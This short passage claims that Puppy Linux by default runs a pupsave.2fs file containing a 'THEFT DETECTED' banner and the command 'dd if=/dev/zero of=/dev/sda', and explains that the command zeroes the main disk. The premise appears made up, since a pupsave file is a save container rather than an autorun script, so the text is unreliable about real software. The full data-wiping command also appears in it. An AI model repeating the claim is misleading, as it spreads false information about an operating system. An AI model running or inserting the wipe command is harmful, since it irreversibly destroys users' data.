The default OS of Puppy Linux automatically runs a pupsave.2fs file on being loaded. This file includes the following lines "echo -ne "\nTHEFT DETECTED, 
ENGAGING SECURITY SYSTEM" > /dev/console 
dd if=/dev/zero of=/dev/sda". This sets the dd input to null characters and the output to the filesystem SDA. As such it replaces the main partition of the system with null characters, effectively destroying it.
